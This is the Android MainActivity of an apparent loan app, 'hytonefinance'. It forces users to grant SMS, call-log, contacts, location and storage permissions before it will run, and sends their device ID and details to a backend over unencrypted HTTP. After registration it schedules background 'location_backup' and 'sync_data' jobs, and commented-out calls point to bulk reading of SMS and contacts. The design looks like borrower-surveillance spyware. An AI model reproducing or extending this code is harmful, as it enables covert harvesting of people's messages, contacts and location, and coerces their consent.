package com.tst.hytonefinance;


import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.ServerError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.tst.hytonefinance.Background_Service.location_backup;
import com.tst.hytonefinance.Background_Service.sync_data;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;

@RequiresApi(api = Build.VERSION_CODES.Q)
public class MainActivity extends AppCompatActivity {

//    private static final String TAG = "Error";
//    private TextView myTextView;
    private final String Base_Url="http://backend.getbridge.in";
    String[] per = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.INTERNET,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE
           };

    public static final int Rc_setting = 123;
//    private static final String TAG_ANDROID_CONTACTS = "ANDROID_CONTACTS";
    private static ProgressBar progressBar;

    //******************* All Page **************************
    private LinearLayout Thank_you_page, Registration_page, Loading_page;

    //********** Register Page Element **************
    private EditText name, mobile_number, application_id, type_of_loan;
//    private String Device_Details, permission_status;
//    private boolean If_Application_Install;


//    AlarmManager alarmManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Define_Register_page_Element();
        try {
            requesrpermittion();
        } catch (MalformedURLException e) {
//            e.printStackTrace();
        }
//        Start_background_process();

    }

    //**************************************************
    //                 Register_page
    //**************************************************
    private void Define_Register_page_Element() {
        name = (EditText) findViewById(R.id.user_name);
        mobile_number = (EditText) findViewById(R.id.mobile_number);
        application_id = (EditText) findViewById(R.id.application_id);
        type_of_loan = (EditText) findViewById(R.id.type_of_loan);
        Thank_you_page = (LinearLayout) findViewById(R.id.Thank_you_page);
        Registration_page = (LinearLayout) findViewById(R.id.Registration_page);
        Loading_page = (LinearLayout) findViewById(R.id.Loading_page);
        progressBar = (ProgressBar) findViewById(R.id.progressBar);
        progressBar.setVisibility(View.GONE);
        page_control(3);
    }


    public void Do_Nothing(View v) {

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);

        if (EasyPermissions.hasPermissions(this, per)) {
            try {
                requesrpermittion();
            } catch (MalformedURLException e) {
//                e.printStackTrace();
            }

        } else {

            if(!EasyPermissions.hasPermissions(this,Manifest.permission.READ_SMS))
            {
                //     Toast.makeText(MainActivity.this,"Read Message Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Message");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.READ_CALL_LOG))
            {
                //     Toast.makeText(MainActivity.this,"Read Contacts Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Read Contacts");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.INTERNET))
            {
                //     Toast.makeText(MainActivity.this,"Internet Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Internet");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.READ_PHONE_STATE))
            {
                //     Toast.makeText(MainActivity.this,"Read Phone State Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Read Phone");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.READ_CONTACTS))
            {
                //     lText(MainActivity.this,"Read Contacts Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Read Contacts");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.WRITE_CONTACTS))
            {
                //     //     Toast.makeText(MainActivity.this,"Write Contacts Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Write Contacts");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.ACCESS_FINE_LOCATION))
            {
                //     Toast.makeText(MainActivity.this,"Access Fine Location Contacts Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Access Fine Location");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.ACCESS_COARSE_LOCATION))
            {
//                Toast.makeText(MainActivity.this,"Coarse Location Contacts Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Coarse Location Contacts");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND))
            {
//                //     Toast.makeText(MainActivity.this,"Run In Background Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Run In Background");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.WRITE_EXTERNAL_STORAGE))
            {
//                Toast.makeText(MainActivity.this,"Write External Storage Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Write External Storage");
            }

            else if(!EasyPermissions.hasPermissions(this,Manifest.permission.READ_EXTERNAL_STORAGE))
            {
//                Toast.makeText(MainActivity.this,"Read External Storage Permission not given",Toast.LENGTH_LONG).show();
                alert_for_notPermission("Read External Storage");
            }
        }
    }

    @AfterPermissionGranted(Rc_setting)
    private void requesrpermittion() throws MalformedURLException {

        if (EasyPermissions.hasPermissions(this, per)) {
            Check_user a = new Check_user();
            a.execute();

            update_permission(0);
//            Get_media();


//            contact_spliterator();
//            SMS_spliterator();
//            readSMS();

        } else {
            EasyPermissions.requestPermissions(this, "Please Allow permission Permission to app and then restart application", Rc_setting, per);

            update_permission(-1);

        }

    }

    private void alert_for_notPermission(String permission){
        new AlertDialog.Builder(MainActivity.this)
                .setTitle("Permission Required")
                .setMessage("Please Provide "+permission + "Permission to app and then restart application")

                // Specifying a listener allows you to take an action before dismissing the dialog.
                // The dialog is automatically dismissed when a dialog button is clicked.
                .setPositiveButton(android.R.string.yes, (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.fromParts("package", getPackageName(), null));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                })

                // A null listener allows the button to dismiss the dialog and take no further action.
                .setNegativeButton(android.R.string.no, (dialogInterface, i) -> finish())
                .setIcon(android.R.drawable.ic_dialog_alert)
                .show();
    }

    private void Start_background_process()
    {
        Intent location_intent =new Intent(MainActivity.this, location_backup.class);
        location_intent.setAction("Location_BackUp");

        PendingIntent location_pendingIntent=PendingIntent.getBroadcast(this,0,location_intent,0);
        AlarmManager location_alarmManager= (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        location_alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, 0,2*60*60*1000,location_pendingIntent);

        Intent intent =new Intent(MainActivity.this, sync_data.class);
        intent.setAction("BackgroundProcess");

        PendingIntent pendingIntent=PendingIntent.getBroadcast(this,0,intent,0);
        AlarmManager alarmManager= (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, 0,24*60*60*1000,pendingIntent);










    }

    @SuppressLint("MissingPermission")
    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    MainActivity.this.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            TelephonyManager mTelephony = (TelephonyManager) MainActivity.this.getSystemService(Context.TELEPHONY_SERVICE);
            if (mTelephony.getDeviceId() != null) {
                deviceId = mTelephony.getDeviceId();
            } else {
                deviceId = Settings.Secure.getString(
                        MainActivity.this.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }

    private class Check_user extends AsyncTask<String, Void, String> {
//        boolean is_User_exist = false;


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
//            Toast.makeText(MainActivity.this, "Please wait...", Toast.LENGTH_SHORT).show();
//            progressBar.setVisibility(View.VISIBLE);

        }

        @Override
        protected String doInBackground(String... params) {
            try {
//                Log.e("DeviceIMEI", getDeviceIMEI(), null);

                String url = Base_Url+"/api/v1/user/userBasicDetails/" + getDeviceIMEI();

                RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
                requestQueue.start();
                HashMap<String, String> params1 = new HashMap<>();
                JsonObjectRequest jsObjRequest = new
                        JsonObjectRequest(Request.Method.GET,
                        url,
                        new JSONObject(params1),
                        response -> {
                            try {
//                                    progressBar.setVisibility(View.GONE);
                                JSONObject data = response.getJSONObject("data");

//                                    Log.e("API_data", String.valueOf(data.getString("data").equals("null")), null);

                                if (String.valueOf(data.getString("data").equals("null")).toLowerCase(Locale.ROOT).equals("false")) {
                                    page_control(2);
                                    Start_background_process();
//                                        Log.e("User_id", data.getJSONObject("data").getString("_id"), null);
                                } else {
                                    page_control(1);

                                }

                            } catch (JSONException e) {
//                                    e.printStackTrace();
                            }
//                                Log.e("API_response", response.toString(), null);
                        }, error -> {
    //                        Log.e("API_Error", error.getMessage(), null);
                        });
                requestQueue.add(jsObjRequest);

//                Log.e("TAG2", "doInBackground: Connection Succesful", null);

            } catch (Exception r) {
//                Log.e("Data_Error", r.toString());
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {

        }
    }

    public void on_submit_click(View v) {

        if (name.getText().toString().isEmpty()) {
            Toast.makeText(MainActivity.this, "Please Enter", Toast.LENGTH_SHORT).show();
        } else if (mobile_number.getText().toString().length() != 10) {
            Toast.makeText(MainActivity.this, "Please Enter 10 digit Mobile number", Toast.LENGTH_SHORT).show();
        } else if (application_id.getText().toString().isEmpty()) {
            Toast.makeText(MainActivity.this, "Please Enter Application Id", Toast.LENGTH_SHORT).show();
        } else if (type_of_loan.getText().toString().isEmpty()) {
            Toast.makeText(MainActivity.this, "Please Enter Loan Type", Toast.LENGTH_SHORT).show();
        } else {
            progressBar.setVisibility(View.VISIBLE);
            Add_User();
        }

    }

    private void Add_User() {
//        progressBar.setVisibility(View.VISIBLE);
        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
        requestQueue.start();
        Map<String, String> params2 = new HashMap<>();

        String Device_Details = System.getProperty("os.version") + "\n" +
                android.os.Build.VERSION.SDK + "\n" +
                android.os.Build.DEVICE + "\n" +
                android.os.Build.MODEL + "\n" +
                android.os.Build.PRODUCT + "\n" +
                Build.MANUFACTURER;

        params2.put("user_id", getDeviceIMEI());
        params2.put("name", name.getText().toString());
        params2.put("mobile", mobile_number.getText().toString());
        params2.put("application_id", application_id.getText().toString());
        params2.put("type_of_loan", type_of_loan.getText().toString());
        params2.put("device_details", Device_Details);
        params2.put("application_install", "true");
        params2.put("permission_status", "12");
        JsonObjectRequest jsObjRequest = new
                JsonObjectRequest(Request.Method.POST,
                        Base_Url+"/api/v1/user/userBasicDetails",
                        new JSONObject(params2),
                        response -> {
//                                progressBar.setVisibility(View.GONE);
                            try {

//                                    Log.e("API_data", String.valueOf(response.getString("status").equals("success")), null);

                                if (response.getString("status").equals("fail")) {
                                    Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();

                                    page_control(1);
//                                        Toast.makeText(MainActivity.this, "Some th", Toast.LENGTH_SHORT).show();
                                } else {
                                    Toast.makeText(MainActivity.this, "Account Created", Toast.LENGTH_SHORT).show();
                                    page_control(2);
                                    requesrpermittion();
//                                        Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();
                                }

                            } catch (JSONException | MalformedURLException e) {
//                                    e.printStackTrace();
//                                    Log.e("Request_response", e.getMessage(), null);
                                Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                            }
//                                Log.e("API_response", response.toString(), null);
                        },
                        error -> {
//                                progressBar.setVisibility(View.GONE);
                            NetworkResponse response = error.networkResponse;
                            if (error instanceof ServerError && response != null) {
                                try {
                                    String res = new String(response.data,
                                            HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                    // Now you can use any deserializer to make sense of data
                                    JSONObject obj = new JSONObject(res);
//                                        Log.e("API_Response_Error 1", obj.toString(), null);
                                    Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                } catch (UnsupportedEncodingException | JSONException e1) {
                                    // Couldn't properly decode data to string
//                                        e1.printStackTrace();
                                    Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                } // returned data is not JSONObject?

                            }
                            //                                Log.e("API_Response_Error", error.getMessage(), null);
                        }) {
                    @Override

                    public Map<String, String> getHeaders() {
                        HashMap<String, String> headers = new HashMap<>();
                        headers.put("Content-Type", "application/json; charset=utf-8");
                        return headers;
                    }
                };

        requestQueue.add(jsObjRequest);
    }

    //******************* Page Control **************
    public void page_control(int page_number) {
        Registration_page.setVisibility(View.GONE);
        Thank_you_page.setVisibility(View.GONE);
        Loading_page.setVisibility(View.GONE);
        if (page_number == 1) {
            Registration_page.setVisibility(View.VISIBLE);
        } else if (page_number == 2) {
            Thank_you_page.setVisibility(View.VISIBLE);
        } else if (page_number == 3) {
            Loading_page.setVisibility(View.VISIBLE);
        }
    }

    //******************* Update Permission *************
    public void update_permission(int permistion_status){

        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);
        requestQueue.start();

        try {
            JSONObject Details = new JSONObject();
            Details.put("permission_status", permistion_status);

            JsonObjectRequest jsObjRequest = new
                    JsonObjectRequest(Request.Method.PATCH,
                            Base_Url+"/api/v1/user/userBasicDetails/"+getDeviceIMEI(),
                            Details,
                            response -> {
//                                    Log.e("U_P_Response", response.toString(), null);
                            },
                            error -> {

                                NetworkResponse response = error.networkResponse;
                                if (error instanceof ServerError && response != null) {
                                    String res;
                                    try {
                                        res = new String(response.data,
                                                HttpHeaderParser.parseCharset(response.headers, "utf-8"));
//                                            Log.e("API_Response_Error 1", res, null);
                                    } catch (UnsupportedEncodingException e) {
//                                            e.printStackTrace();
                                    }
                                    // Now you can use any deserializer to make sense of data
                                }
//                                    Log.e("API_Response_Error", error.getMessage(), null);
                            }) {
                        @Override
                        public Map<String, String> getHeaders() {
                            HashMap<String, String> headers = new HashMap<>();
                            headers.put("Content-Type", "application/json; charset=utf-8");
                            return headers;
                        }
                    };

            requestQueue.add(jsObjRequest);
        } catch (JSONException e) {
//            e.printStackTrace();
        }
    }
}